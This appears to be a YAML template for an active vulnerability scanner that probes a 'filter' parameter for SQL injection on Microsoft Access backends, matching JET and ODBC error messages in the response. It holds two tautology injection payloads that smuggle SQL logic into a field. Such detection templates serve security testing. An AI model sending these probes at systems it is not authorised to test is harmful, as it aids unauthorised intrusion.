id: sqli6-access-08
name: 'SQLi access probe in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - access
description: 'Triggers access error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - '") OR ("1"="1'
        - '1'' AND ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Microsoft JET'
          - 'ODBC Microsoft Access'
